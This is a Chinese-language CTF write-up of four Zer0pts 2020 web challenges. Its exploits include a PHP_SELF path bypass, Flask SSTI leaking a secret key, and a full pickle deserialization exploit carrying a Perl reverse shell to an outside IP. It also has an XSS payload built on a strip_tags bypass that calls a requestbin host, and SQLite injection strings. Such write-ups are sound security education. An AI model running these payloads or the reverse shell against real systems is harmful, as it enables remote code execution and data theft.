# Zer0pts2020

## Can you guess it?

给了源码
```php
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Can you guess it?</title>
  </head>
  <body>
    <h1>Can you guess it?</h1>
    <p>If your guess is correct, I'll give you the flag.</p>
    <p><a href="?source">Source</a></p>
    <hr>
<?php if (isset($message)) { ?>
    <p><?= $message ?></p>
<?php } ?>
    <form action="index.php" method="POST">
      <input type="text" name="guess">
      <input type="submit">
    </form>
  </body>
</html>
```

发现``hash_equals``绕不过去，只能想办法从别的地方入手

问题出在``$_SERVER['PHP_SELF']``

>$_SERVER['PHP_SELF'] 表示当前 php 文件相对于网站根目录的位置地址，与 document root 相关。
>
>假设我们有如下网址，$_SERVER['PHP_SELF']得到的结果分别为：
>
>http://ctf.ieki.xyz/php/ ：/php/index.php
>http://ctf.ieki.xyz/php/index.php ：/php/index.php
>http://ctf.ieki.xyz/php/index.php?test=foo ：/php/index.php
>http://ctf.ieki.xyz/php/index.php/test/foo ：/php/index.php/test/foo
>
>```php
>$url = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
>```


用Unicode可以绕过

payload

```
http://2086784a-a065-458e-8566-2d1a200b1f41.node3.buuoj.cn/index.php/config.php/%E5%95%A5?source
```

## Notepad

源码审计，有很明显的SSTI

```python
@app.errorhandler(404)
def page_not_found(error):
    """ Automatically go back when page is not found """
    referrer = flask.request.headers.get("Referer")
    
    if referrer is None: referrer = '/'
    if not valid_url(referrer): referrer = '/'
    
    html = '<html><head><meta http-equiv="Refresh" content="3;URL={}"><title>404 Not Found</title></head><body>Page not found. Redirecting...</body></html>'.format(referrer)
    
    return flask.render_template_string(html), 404

def valid_url(url):
    """ Check if given url is valid """
    host = flask.request.host_url
    
    if not url.startswith(host): return False  # Not from my server
    if len(url) - len(host) > 16: return False # Referer may be also 404
    
    return True
```

POC:
```
Referer:  http://37785aff-4b7b-4655-8a7f-b86e7af93f88.node3.buuoj.cn/{{7*7}}
```

限制了payload长度...

发现有``session``去读``SECRET_KEY``看看

```
&#39;SECRET_KEY&#39;: b&#39;&#34;\xe8#I\xc5\xb8y\x95-\xc5\xb4\xab7\xf3Oh&#39;
->
'SECRET_KEY': b'"\xe8#I\xc5\xb8y\x95-\xc5\xb4\xab7\xf3Oh'
```

Tips:
> 命令行下输入不可见字符可以使用
> -s `echo ueUt4wLFsf5b9T3iO2TzhQ==|base64 -d`

看下Session存的啥

利用flask-session-cookie解码工具可以看到里面有savedata

多次解码后可以看到很像pickle序列化对象

事实上我们也可以从源码中发现这一点

```python
def load():
    """ Load saved notes """
    try:
        savedata = flask.session.get('savedata', None)
        data = pickle.loads(base64.b64decode(savedata))
    except:
        data = [{"date": now(), "text": "", "title": "*New Note*"}]
    
    return data
```


那么解法就很明显了,利用反序列反弹shell或者curl外带数据

Exp:

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
import pickle 
import sys
import base64
import pickletools

COMMAND = """perl -e 'use Socket;$i="174.1.197.19";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
# 174.1.197.19

class PickleRce(object):
    def __init__(self):
        super(PickleRce, self).__init__()
        self.id = 1
        self.name ="eki"
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))
x = PickleRce()
s = pickle.dumps(x)

pickletools.dis(s)

app = Flask(__name__)
app.secret_key = b'"\xe8#I\xc5\xb8y\x95-\xc5\xb4\xab7\xf3Oh'

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)


payload= {"savedata": base64.b64encode(s)}
print(session_serializer.dumps(payload))
```


## music blog

题目中说给管理员看 大概是个xss题

网页源码有个交互按钮

```
<a href="like.php?id=b54959b9-9a17-43d6-a2d8-5e800ce6d8d2" id="like" class="btn btn-love">♥ Like this post</a>
```

php strip_tags的一个问题

```
root@737a6cc33ba8:~# php -r "echo strip_tags('<script>','<audio>');"
root@737a6cc33ba8:~# php -r "echo strip_tags('</audio>','<audio>');"
</audio>
root@737a6cc33ba8:~# php -r "echo strip_tags('<a/udio>','<audio>');"
<a/udio>
```

Exp:

```html
<a/udio id=like href=http://http.requestbin.buuoj.cn/1j616ye1>eki
```

## phpNantokaAdmin


```sql
select Name from User
->
Name
Eki
John
Alice

select [Name][123] from User
->
123
Eki
John
Alice
```

对于这道题

```sql
CREATE TABLE $table_name (dummy1 TEXT, dummy2 TEXT, `$column` $type);

table_name=[abc]as select [sql][&columns[0][name]=]from sqlite_master;&columns[0][type]=1
->
$sql = "CREATE TABLE [abc] as select [sql][ (dummy1 TEXT, dummy2 TEXT, `]from sqlite_master;` 1);";
->
create table [abc] as select sql from sqlite_master
```

注就完了

-> ``CREATE TABLE `flag_bf1811da` (`flag_2a2d04c3` TEXT)``

-> ``table_name=[abc]as select [flag_2a2d04c3][&columns[0][name]=]from flag_bf1811da;&columns[0][type]=1``
